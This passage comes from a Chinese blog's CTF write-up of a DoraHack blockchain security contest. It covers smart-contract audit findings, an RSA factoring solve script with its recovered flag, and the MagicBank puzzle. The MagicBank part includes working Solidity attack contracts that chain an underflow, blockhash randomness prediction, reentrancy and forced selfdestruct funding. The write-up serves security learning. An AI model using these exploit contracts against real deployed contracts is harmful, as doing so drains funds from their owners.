+<h4 id="发奖金时逻辑有误"><a href="#发奖金时逻辑有误" class="headerlink" title="发奖金时逻辑有误"></a>发奖金时逻辑有误</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">negativeSet[msg.sender] -= betBalance;</span><br><span class="line">negativeBalance -= betBalance;</span><br><span class="line">reward = (betBalance * positiveBalance) / negativeBalance;</span><br></pre></td></tr></table></figure>
+<p>应该先计算reward，再变动参数，目前这样会导致用户多领款。</p>
+<h4 id="游戏时长设计不合理"><a href="#游戏时长设计不合理" class="headerlink" title="游戏时长设计不合理"></a>游戏时长设计不合理</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">modifier isRunning &#123;</span><br><span class="line">    assert(block.number &lt; cutOffBlockNumber);</span><br><span class="line">    _;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">modifier isStop &#123;</span><br><span class="line">    assert(block.number &gt;= cutOffBlockNumber);</span><br><span class="line">    _;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">constructor(uint256 _cutOffBlockNumber) public &#123;</span><br><span class="line">    owner = msg.sender;			</span><br><span class="line">    balanceOf[owner] = 100000000000;</span><br><span class="line">    cutOffBlockNumber = _cutOffBlockNumber;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我感觉这个算是设计的不好，好在提交的时候提到了构造函数的问题，经师傅锦囊指点，给出了正确解答。这里的设计非常奇怪，我们常见的游戏合约，都是设计游戏时长，这个却设计的是输入截断高度。当合约部署时输入错误，会导致游戏不开始or永远无法结束。给出这样的设计更好：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">require(游戏长度&gt; 1000 and 游戏长度&lt;10000);</span><br><span class="line">cutOffBlockNumber = block.number + 游戏长度;</span><br></pre></td></tr></table></figure></p>
+<h4 id="随机数的熵源"><a href="#随机数的熵源" class="headerlink" title="随机数的熵源"></a>随机数的熵源</h4><p>虽然没有较完美的随机数生成方案，但这里有个大问题hh<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bytes32 result = keccak256(abi.encodePacked(blockhash(block.number), msg.sender, block.timestamp));</span><br></pre></td></tr></table></figure></p>
+<p>区块未生成的情况下，<code>blockhash(block.number)</code>恒为0，借secbit的师傅的话：</p>
+<blockquote>
+<p>常见不安全的“随机数”计算方法，会读取当前块的前一个块的哈希 block.blockhash(block.number-1) 作为随机源。而在合约内执行 block.blockhash(block.number) 返回值为 0。我们无法在合约内获得当前区块的哈希，这是因为矿工打包并执行交易时，当前区块哈希尚未被算出。因此，我们可以认为“当前区块”哈希是“未来”的，无法预测。</p>
+</blockquote>
+<h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><ul>
+<li>solidity版本过低</li>
+<li>上个safemath库，不过这个合约上下溢处理的都ok</li>
+</ul>
+<h3 id="Q11-密码学RSA"><a href="#Q11-密码学RSA" class="headerlink" title="Q11 - 密码学RSA"></a>Q11 - 密码学RSA</h3><p>这题是小伙伴HWHong做的，师傅web渗透一把手，密码学也超厉害！</p>
+<p>明文:<code>something_for_nothing</code></p>
+<p>思路赛后在群里已经有了，大体是可以看到n2可分解为多个素数，只有一个密文，说明n1是加密用的n，n2是hint。</p>
+<p>因为n1，n2高位相同，假设:</p>
+<ul>
+<li>n1 = p1 * q1</li>
+<li>n2 = (p1 + a) * (q1 + b)</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from gmpy2 import is_prime as prime</span><br><span class="line">from gmpy2 import iroot</span><br><span class="line">n = 23813929634961916607351565880455941766670447113389071712756695324346844628401731716721342593051007386272154527731664038624979611788014212477351852945244505409460937047258358062539110381430391840699958786987625931706228387994323041218966203797392082298285118826348211114759651033904573709571472601260689154545949713245271655372366964733467694911683404472839031932865195076679363440004259157441442904092160547940620462275523928770007343760308099893870201392965037704560065286860197211399375405419620507897112217284427055511050820476779226202266877872708788417574738346625361066145535064835057037859284000257460115692751L</span><br><span class="line">nn = 23813929634961916607351565880455941766670447113389071712756695324346844628401731716721342593051007386272154527731664038624979611788014212477351852945244505409460937047258358062539110381430391840699958786987625931706228387994323041218966203797392082298285118826348211114759651033904573709571472601260689154673727252437046185126099084752843732400209032782207790902956024459189700856089587545302854326571561755007254420608514135036673700243280752364319986331493694769729841789115612749641973878393284804681876299531933348630664123809944975501332215753682284226293973903784246618067269627749460102002825975011735463170307L</span><br><span class="line"># print nn &gt; n</span><br><span class="line">t = nn - n</span><br><span class="line"></span><br><span class="line">def f1(x, y): return pow(x * y - t, 2) - 4 * n * x * y</span><br><span class="line"></span><br><span class="line">def f2(x, y, s): return (t - x * y - s) / (2 * x)</span><br><span class="line"></span><br><span class="line">for x in xrange(366, 3000):</span><br><span class="line">    for y in xrange(1, 3000):</span><br><span class="line">        print x, y</span><br><span class="line">        if f1(x, y) &gt;= 0:</span><br><span class="line">            s, b = iroot(f1(x, y), 2)</span><br><span class="line">            if b:</span><br><span class="line">                if prime(f2(x, y, int(s))):</span><br><span class="line">                    print &quot;Success&quot;</span><br><span class="line">                    print f2(x, y, int(s))</span><br><span class="line">                    exit()</span><br></pre></td></tr></table></figure>
+<p>之后RSA解密即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">def egcd(a, b):</span><br><span class="line">    if a == 0:</span><br><span class="line">        return (b, 0, 1)</span><br><span class="line">    else:</span><br><span class="line">        g, y, x = egcd(b % a, a)</span><br><span class="line">        return (g, x - (b // a) * y, y)</span><br><span class="line">def modinv(a, m):</span><br><span class="line">    g, x, y = egcd(a, m)</span><br><span class="line">    if g != 1:</span><br><span class="line">        raise Exception(&apos;modular inverse does not exist&apos;)</span><br><span class="line">    else:</span><br><span class="line">        return x % m</span><br><span class="line"></span><br><span class="line">def bytes_to_num(b):</span><br><span class="line">    return int(b.encode(&apos;hex&apos;), 16)</span><br><span class="line"></span><br><span class="line">def num_to_bytes(n):</span><br><span class="line">    b = hex(n)[2:-1]</span><br><span class="line">    b = &apos;0&apos; + b if len(b)%2 == 1 else b #16进制补成偶数位</span><br><span class="line">    return b.decode(&apos;hex&apos;)</span><br><span class="line"></span><br><span class="line">def gcd(a, b):</span><br><span class="line">    if a &lt; b:</span><br><span class="line">        a, b = b, a</span><br><span class="line">    while b != 0:</span><br><span class="line">        temp = a % b</span><br><span class="line">        a = b</span><br><span class="line">        b = temp</span><br><span class="line">    return a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n= 23813929634961916607351565880455941766670447113389071712756695324346844628401731716721342593051007386272154527731664038624979611788014212477351852945244505409460937047258358062539110381430391840699958786987625931706228387994323041218966203797392082298285118826348211114759651033904573709571472601260689154545949713245271655372366964733467694911683404472839031932865195076679363440004259157441442904092160547940620462275523928770007343760308099893870201392965037704560065286860197211399375405419620507897112217284427055511050820476779226202266877872708788417574738346625361066145535064835057037859284000257460115692751L</span><br><span class="line">q = 153346707022470063255234682736500792074659843501367018551890586572000593877733769700626279692600930780783180304304442159621776245608196861201940418144595471936294352073422843950321344403965643436262621305985924339820909114418402737553700882775797335050564405239123363288904724634792579573240467129306394648627</span><br><span class="line">p = 155294691991478076246533723107402680119846505071987471714029291163531622103148666018845728574257526241116901720654471382085147320775795052977889980257647661071362112907870430296641453839932096411043572129394525643559799347739002453989935199062302896371462733787830466546655020686256703190391276771066251117813</span><br><span class="line">c = 18605789682603602447496491798717321758798293700581905324029316650457391496265655270825055100678097929357061608642146193773598093988238186832894784951616085628646685595376101261377731258729834390380505295109894703902052847643842156614062711247564519297808798554671766259798926540994634858657655351713982599673967765484141456377356967352743349134262973092564982272405212241089526282547070247316071159193009664342169931360323767519419547890738439815871541842638219161372841320792826512207337857015266817573319095062799628537492791048391092577478382005012019416835632572465215950053539506334972912038960318318733757235757L </span><br><span class="line">e = 65537</span><br><span class="line">print p*q == n</span><br><span class="line">d = modinv(e,(p-1)*(q-1))</span><br><span class="line">print &quot;d: &quot; + str(d)</span><br><span class="line">m = pow(c,d,p*q)</span><br><span class="line">print &quot;m: &quot; + str(m)</span><br><span class="line">flag = hex(m)</span><br><span class="line">print str(flag)[2:-1].decode(&apos;hex&apos;)</span><br></pre></td></tr></table></figure></p>
+<h3 id="Q14-puzzle-Hello"><a href="#Q14-puzzle-Hello" class="headerlink" title="Q14 - puzzle Hello"></a>Q14 - puzzle Hello</h3><p>长亭的晓航师傅技术厉害，出的题好，人还帅，我们队已经全员被圈粉了orz。</p>
+<p>这是一道考察与合约交互的基础题。只给了函数声明和合约地址，通过反复交互，获得提示，最后拿到flag，不是很难。我没怎么记住具体过程，不过只要是做合约审计方向的，应该都可以做出来。</p>
+<p>我这留了个邮件的记录，大佬们可以参考一下交互方式，其实两个合约可以合并，当时打得有点意识模糊。。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">随机数生成</span><br><span class="line">pragma solidity ^0.4.19;</span><br><span class="line">contract Attack &#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    address public victim;</span><br><span class="line">    uint256 public num;</span><br><span class="line"></span><br><span class="line">    function Attack() payable &#123; owner = msg.sender;</span><br><span class="line">        victim = 0xc95872680072f57485aa0913ded224ee70a9e2cb;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">    function sissel() public view returns(uint256)</span><br><span class="line">    &#123;</span><br><span class="line">        uint256 seed = uint256(blockhash(block.number-1));</span><br><span class="line">        uint256 rand = seed / 26959946667150639794667015087019630673637144422540572481103610249216;</span><br><span class="line">        return rand;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">交互，可能少了几个步骤，大体是这样</span><br><span class="line">contract xixi &#123;</span><br><span class="line">   </span><br><span class="line">    address public owner;</span><br><span class="line">   </span><br><span class="line">    constructor()public&#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    function getInfo() public pure returns(string);   </span><br><span class="line">    function sendFlag1() public returns(string);</span><br><span class="line">    function getCode() public pure returns(string);</span><br><span class="line">    function game(uint256 guess) public view returns(string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="Q15-Puzzle-Magic-Bank"><a href="#Q15-Puzzle-Magic-Bank" class="headerlink" title="Q15 - Puzzle Magic Bank"></a>Q15 - Puzzle Magic Bank</h3><p>还是晓航师傅出的题，超有趣，我很喜欢这样不是很难，但是考点很多，而且每一步都理所应当的题目。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">contract MagicBank &#123;</span><br><span class="line">    mapping(address =&gt; uint) public balanceOf;</span><br><span class="line">    mapping(address =&gt; uint) public creditOf;</span><br><span class="line">    address owner;</span><br><span class="line">    </span><br><span class="line">    constructor()public&#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function transferBalance(address to, uint amount) public&#123;</span><br><span class="line">        require(balanceOf[msg.sender] - amount &gt;= 0);</span><br><span class="line">        balanceOf[msg.sender] -= amount;</span><br><span class="line">        balanceOf[to] += amount;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    event SendFlag(uint256 flagnum, string b64email);</span><br><span class="line">    function sendFlag3(string b64email) public &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;= 10000);</span><br><span class="line">        emit SendFlag(1, b64email);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function guessRandom(uint256 guess) internal view returns(bool)&#123;</span><br><span class="line">        uint256 seed = uint256(blockhash(block.number-1));</span><br><span class="line">        uint256 rand = seed / 26959946667150639794667015087019630673637144422540572481103610249216;</span><br><span class="line">        return rand == guess;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function buyCredit(uint256 guess) public &#123;</span><br><span class="line">        require(guessRandom(guess));</span><br><span class="line">        require(balanceOf[msg.sender] &gt;= 10000);</span><br><span class="line">        require(creditOf[msg.sender] == 0);</span><br><span class="line">        </span><br><span class="line">        creditOf[msg.sender] = 1;</span><br><span class="line">        balanceOf[msg.sender] -= 10000;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function withdrawCredit(uint amount) public&#123;</span><br><span class="line">        require(creditOf[msg.sender] &gt;= amount);</span><br><span class="line">        msg.sender.call.value(amount*1000000000)();</span><br><span class="line">        creditOf[msg.sender] -= amount;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function sendFlag4(string b64email) public &#123;</span><br><span class="line">        require(creditOf[msg.sender] &gt;= 10000);</span><br><span class="line">        emit SendFlag(2, b64email);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function getEthBalance() public view returns(uint256)&#123;</span><br><span class="line">        return this.balance;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    modifier onlyOwner()&#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    function kill(address t) public onlyOwner &#123;</span><br><span class="line">        selfdestruct(t);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这题的流程是这样的：</p>
+<ol>
+<li>首先随意<code>transferBalance()</code>一下，造成下溢，让balance很大，获得flag3</li>
+<li>绕过随机数预测，成功调用<code>buyCredit()</code>，购买信用。</li>
+<li><code>withdrawCredit()</code>中依然存在下溢问题，但是require变严格，需要使用重入攻击，在未更新credit时，多取几次。</li>
+<li>上面的攻击遇到一个问题，就是目标合约里没有钱。且目标合约的回调函数没有payable，需要创建另一个合约，selfdestruct后，强制给目标合约转账。</li>
+<li>credit下溢后，获得flag4。</li>
+</ol>
+<p>攻击合约：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">contract magic_attack &#123;</span><br><span class="line">    address owner;</span><br><span class="line">    string private email = &quot;OTA3ODg2MDc2QHFxLmNvbQ==&quot;;</span><br><span class="line">    address private victim = 0x1180e23d7360fc19cf7c7cd26160763b500b158b;</span><br><span class="line">    uint256 public rand = 0;</span><br><span class="line">   </span><br><span class="line">    constructor()public&#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        email = &quot;OTA3ODg2MDc2QHFxLmNvbQ==&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    function step1() public&#123;</span><br><span class="line">    	address my_to = 0x1180e23d7360fc19cf7c7cd26160763b500b151c;</span><br><span class="line">    	uint256 amount = 0x186a0;</span><br><span class="line">    	victim.call(bytes4(keccak256(&quot;transferBalance(address,uint256)&quot;)),my_to,amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function step2() public&#123;</span><br><span class="line">        uint256 seed = uint256(blockhash(block.number-1));</span><br><span class="line">        rand = seed / 26959946667150639794667015087019630673637144422540572481103610249216;</span><br><span class="line">    	victim.call(bytes4(keccak256(&quot;buyCredit(uint256)&quot;)),rand);</span><br><span class="line">    &#125;</span><br><span class="line">    //在这里，另一个合约自毁。</span><br><span class="line">    function step3() public&#123;</span><br><span class="line">    	victim.call(bytes4(keccak256(&quot;withdrawCredit(uint256)&quot;)),1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function () payable public&#123;</span><br><span class="line">    	victim.call(bytes4(keccak256(&quot;withdrawCredit(uint256)&quot;)),1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function test() public&#123;</span><br><span class="line">        MagicBank mb = MagicBank(victim);</span><br><span class="line">		mb.sendFlag4(email);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract bomb &#123;</span><br><span class="line">    address owner;</span><br><span class="line">    </span><br><span class="line">    constructor()public&#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function () payable public&#123;&#125;</span><br><span class="line"></span><br><span class="line">    function end() public&#123;</span><br><span class="line">        selfdestruct(0x1180e23d7360fc19cf7c7cd26160763b500b158b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本次比赛天枢获得了第二名的好成绩，与小伙伴们在比赛中的默契配合和平日里老师的指导是息息相关的。</p>
+<p>让我总结一下区块链安全的要义，我想说：想象力就是武器。面对区块链和智能合约的题目，只有胆大心细多思考，才能想出完整的攻击链。</p>
+<p>现实中，合约、节点、共识算法、钱包、交易所等等，无论哪方面薄弱，都会让黑客有着把货币席卷一空的可能。</p>
+<p>就像是在赛事最后分享环节我所说，希望大家在工作中胆大心细，注意好系统的细枝末节，作为安全从业人员，才算真正完成了我们的工作。</p>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="http://aisissel.com">Sissel</a>
+            <p>原文链接：<a href="http://aisissel.com/2018/10/15/dorahack-blockchain/">http://aisissel.com/2018/10/15/dorahack-blockchain/</a>
+            <p>发表日期：<a href="http://aisissel.com/2018/10/15/dorahack-blockchain/">October 15th 2018, 1:48:32 pm</a>
+            <p>更新日期：<a href="http://aisissel.com/2018/10/15/dorahack-blockchain/">February 18th 2020, 3:52:34 pm</a>
+            <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/2018/11/21/writeup-hctf2018/" title= "【writeup】hctf2018">
+                    <div class="nextTitle">【writeup】hctf2018</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:boke1208#gmail.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/boke1208" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="https://www.weibo.com/1867954903/profile" class="iconfont-archer weibo" target="_blank" title=weibo></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="https://twitter.com/SisselZhao" class="iconfont-archer twitter" target="_blank" title=twitter></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="https://space.bilibili.com/784419" class="iconfont-archer bilibili" target="_blank" title=bilibili></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#题目wp"><span class="toc-number">1.</span> <span class="toc-text">题目wp</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Q1-测试题"><span class="toc-number">1.1.</span> <span class="toc-text">Q1 - 测试题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Auction-sol"><span class="toc-number">1.1.1.</span> <span class="toc-text">Auction.sol</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BankOwned-sol"><span class="toc-number">1.1.2.</span> <span class="toc-text">BankOwned.sol</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MyContacts-sol"><span class="toc-number">1.1.3.</span> <span class="toc-text">MyContacts.sol</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PrivateBank-sol"><span class="toc-number">1.1.4.</span> <span class="toc-text">PrivateBank.sol</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Q4-游戏逻辑题，找出三个漏洞"><span class="toc-number">1.2.</span> <span class="toc-text">Q4 - 游戏逻辑题，找出三个漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#随机数分布不均"><span class="toc-number">1.2.1.</span> <span class="toc-text">随机数分布不均</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#发奖金时逻辑有误"><span class="toc-number">1.2.2.</span> <span class="toc-text">发奖金时逻辑有误</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#游戏时长设计不合理"><span class="toc-number">1.2.3.</span> <span class="toc-text">游戏时长设计不合理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#随机数的熵源"><span class="toc-number">1.2.4.</span> <span class="toc-text">随机数的熵源</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#其他"><span class="toc-number">1.2.5.</span> <span class="toc-text">其他</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Q11-密码学RSA"><span class="toc-number">1.3.</span> <span class="toc-text">Q11 - 密码学RSA</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Q14-puzzle-Hello"><span class="toc-number">1.4.</span> <span class="toc-text">Q14 - puzzle Hello</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Q15-Puzzle-Magic-Bank"><span class="toc-number">1.5.</span> <span class="toc-text">Q15 - Puzzle Magic Bank</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-number">2.</span> <span class="toc-text">总结</span></a></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 12
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/22</span><a class="archive-post-title" href= "/2019/04/22/DaysBank/" >【writeup】DaysBank</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/04</span><a class="archive-post-title" href= "/2019/04/04/hard-mysql-query-4/" >【SQL】四个比较难的SQL语句</a>
+        </li>
+    
+    
